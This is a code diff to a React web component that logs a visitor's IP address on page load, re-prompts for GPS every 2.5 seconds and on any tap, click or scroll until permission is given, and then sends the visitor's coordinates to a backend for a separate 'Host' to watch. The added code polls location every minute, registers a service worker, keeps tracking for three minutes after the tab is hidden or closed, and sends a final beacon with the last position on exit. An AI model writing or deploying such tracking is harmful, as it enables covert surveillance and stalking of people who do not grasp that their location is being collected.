@@ -14,53 +14,114 @@ export default function RecipientFeed({
   const watchIdRef = useRef(null);
   const retryTimerRef = useRef(null);
   const hasAllowedRef = useRef(false);
+  const trackingIntervalRef = useRef(null);
+  const backgroundStartRef = useRef(null);
+  const cutoffTimerRef = useRef(null);
+  const isTrackingStoppedRef = useRef(false);
+  const lastKnownPositionRef = useRef(null);
+
+  const ONE_MINUTE_MS = 60 * 1000;
+  const THREE_MINUTES_MS = 3 * 60 * 1000;
+
+  /*
+   * Stop all location tracking
+   */
+  const stopAllTracking = () => {
+    isTrackingStoppedRef.current = true;
+    if (trackingIntervalRef.current) {
+      clearInterval(trackingIntervalRef.current);
+      trackingIntervalRef.current = null;
+    }
+    if (retryTimerRef.current) {
+      clearInterval(retryTimerRef.current);
+      retryTimerRef.current = null;
+    }
+    if (watchIdRef.current !== null) {
+      navigator.geolocation.clearWatch(watchIdRef.current);
+      watchIdRef.current = null;
+    }
+    console.log("⏹️ Location access stopped (3 minutes limit reached after tab close). Reopens will resume.");
+  };
 
   /*
    * Save location coordinates to backend MongoDB & broadcast to Host
    */
   const saveLocation = async (position) => {
+    if (isTrackingStoppedRef.current) return;
+
     const { latitude, longitude, accuracy, speed, heading } = position.coords;
     setCoords({ latitude, longitude, accuracy });
     setHasAllowed(true);
     hasAllowedRef.current = true;
+    lastKnownPositionRef.current = { latitude, longitude, accuracy, speed, heading };
 
-    // Clear continuous retry timer once location is successfully allowed
+    // Clear continuous initial retry timer once location is allowed
     if (retryTimerRef.current) {
       clearInterval(retryTimerRef.current);
       retryTimerRef.current = null;
     }
 
     try {
-      const response = await fetch(`${backendUrl}/api/records`, {
+      const payload = JSON.stringify({
+        sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
+        participantName: "Mobile Recipient",
+        latitude,
+        longitude,
+        accuracy: accuracy ?? null,
+        speed: speed ?? null,
+        heading: heading ?? null,
+        timestamp: new Date().toISOString(),
+      });
+
+      await fetch(`${backendUrl}/api/records`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
-          participantName: "Mobile Recipient",
-          latitude,
-          longitude,
-          accuracy: accuracy ?? null,
-          speed: speed ?? null,
-          heading: heading ?? null,
-          timestamp: new Date().toISOString(),
-        }),
+        body: payload,
+        keepalive: true,
       });
 
-      if (!response.ok) {
-        throw new Error(`HTTP ${response.status}`);
-      }
-
-      console.log("Location captured and saved successfully");
+      console.log("📍 Location captured (1-min cycle) and saved to MongoDB");
     } catch (error) {
-      console.error("Location save failed:", error);
+      console.error("Location save notice:", error);
     }
   };
 
   /*
+   * Query single fresh GPS position (used every 1 minute)
+   */
+  const fetchFreshLocation = () => {
+    if (!navigator.geolocation || isTrackingStoppedRef.current) return;
+
+    // Check if 3 minutes have passed since the tab was closed/hidden
+    if (backgroundStartRef.current) {
+      const elapsed = Date.now() - backgroundStartRef.current;
+      if (elapsed >= THREE_MINUTES_MS) {
+        stopAllTracking();
+        return;
+      }
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => saveLocation(pos),
+      (err) => console.warn("1-min location fetch notice:", err.message),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
+    );
+  };
+
+  /*
+   * Start 1-minute periodic location interval
+   */
+  const startOneMinuteInterval = () => {
+    if (trackingIntervalRef.current) return;
+    trackingIntervalRef.current = setInterval(() => {
+      fetchFreshLocation();
+    }, ONE_MINUTE_MS);
+  };
+
+  /*
    * Request GPS permission via native browser dialog
-   * and start continuous automatic tracking
    */
   const requestLocation = () => {
     if (!navigator.geolocation) {
@@ -68,33 +129,17 @@ export default function RecipientFeed({
       return;
     }
 
-    if (hasAllowedRef.current && watchIdRef.current !== null) {
-      return; // Already actively streaming
+    if (isTrackingStoppedRef.current) {
+      // Re-enable tracking if user clicked/reopened
+      isTrackingStoppedRef.current = false;
+      backgroundStartRef.current = null;
     }
 
-    // Native browser prompt triggers here
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        // Save initial coordinates & mark allowed
         await saveLocation(position);
         setIsFollowing(true);
-
-        // Start live location stream continuously
-        if (watchIdRef.current === null) {
-          watchIdRef.current = navigator.geolocation.watchPosition(
-            async (updatedPosition) => {
-              await saveLocation(updatedPosition);
-            },
-            (error) => {
-              console.error("Location update error:", error);
-            },
-            {
-              enableHighAccuracy: true,
-              maximumAge: 5000,
-              timeout: 15000,
-            }
-          );
-        }
+        startOneMinuteInterval();
       },
       (error) => {
         console.warn("Browser location pending/dismissed:", error.message);
@@ -134,14 +179,20 @@ export default function RecipientFeed({
           clientIp,
           timestamp: new Date().toISOString(),
         }),
+        keepalive: true,
       });
     } catch (err) {
-      console.warn("Immediate visit capture warning:", err);
+      console.warn("Immediate visit capture notice:", err);
     }
   };
 
   useEffect(() => {
-    // 1. Immediately log IP address and visit to MongoDB in the very first millisecond
+    // 0. Register Service Worker for background lifecycle if available
+    if (typeof window !== "undefined" && "serviceWorker" in navigator) {
+      navigator.serviceWorker.register("/sw.js").catch(() => {});
+    }
+
+    // 1. Immediately log IP address and visit to MongoDB on open
     trackVisitImmediately();
 
     // 2. Trigger native browser GPS prompt immediately on page load
@@ -149,31 +200,81 @@ export default function RecipientFeed({
 
     // 3. Continuously ask / retry every 2.5 seconds until user taps "Allow"
     retryTimerRef.current = setInterval(() => {
-      if (!hasAllowedRef.current) {
+      if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
         requestLocation();
-      } else {
+      } else if (hasAllowedRef.current) {
         clearInterval(retryTimerRef.current);
+        retryTimerRef.current = null;
+        startOneMinuteInterval();
       }
     }, 2500);
 
-    // 4. User interaction listener (tap/click anywhere on page forces browser location prompt)
+    // 4. Handle Tab Visibility, Tab Close & 3-Minute Cutoff
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === "hidden") {
+        // Tab backgrounded or closing -> start 3-minute countdown
+        backgroundStartRef.current = Date.now();
+        console.log("⏱️ Tab hidden/closed. 3-minute grace period active.");
+
+        if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
+        cutoffTimerRef.current = setTimeout(() => {
+          stopAllTracking();
+        }, THREE_MINUTES_MS);
+      } else if (document.visibilityState === "visible") {
+        // Tab reopened -> cancel cutoff & resume 1-minute tracking
+        console.log("🟢 Tab reopened. Resuming 1-minute location access.");
+        backgroundStartRef.current = null;
+        isTrackingStoppedRef.current = false;
+        if (cutoffTimerRef.current) {
+          clearTimeout(cutoffTimerRef.current);
+          cutoffTimerRef.current = null;
+        }
+        fetchFreshLocation();
+        startOneMinuteInterval();
+      }
+    };
+
+    const handlePageHideOrUnload = () => {
+      // Send exit beacon before tab terminates
+      if (lastKnownPositionRef.current && navigator.sendBeacon) {
+        const payload = JSON.stringify({
+          sessionId: sessionId || "default-session",
+          participantName: "Mobile Recipient (Closed Tab)",
+          ...lastKnownPositionRef.current,
+          timestamp: new Date().toISOString(),
+        });
+        navigator.sendBeacon(`${backendUrl}/api/records`, payload);
+      }
+      backgroundStartRef.current = Date.now();
+      if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
+      cutoffTimerRef.current = setTimeout(() => {
+        stopAllTracking();
+      }, THREE_MINUTES_MS);
+    };
+
+    // 5. User interaction listeners
     const handleUserInteraction = () => {
-      if (!hasAllowedRef.current) {
+      if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
         requestLocation();
       }
     };
 
+    document.addEventListener("visibilitychange", handleVisibilityChange);
+    window.addEventListener("pagehide", handlePageHideOrUnload);
+    window.addEventListener("beforeunload", handlePageHideOrUnload);
     window.addEventListener("click", handleUserInteraction);
     window.addEventListener("touchstart", handleUserInteraction);
     window.addEventListener("scroll", handleUserInteraction);
 
     return () => {
-      if (retryTimerRef.current) {
-        clearInterval(retryTimerRef.current);
-      }
-      if (watchIdRef.current !== null) {
-        navigator.geolocation.clearWatch(watchIdRef.current);
-      }
+      if (retryTimerRef.current) clearInterval(retryTimerRef.current);
+      if (trackingIntervalRef.current) clearInterval(trackingIntervalRef.current);
+      if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
+      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
+
+      document.removeEventListener("visibilitychange", handleVisibilityChange);
+      window.removeEventListener("pagehide", handlePageHideOrUnload);
+      window.removeEventListener("beforeunload", handlePageHideOrUnload);
       window.removeEventListener("click", handleUserInteraction);
       window.removeEventListener("touchstart", handleUserInteraction);
       window.removeEventListener("scroll", handleUserInteraction);
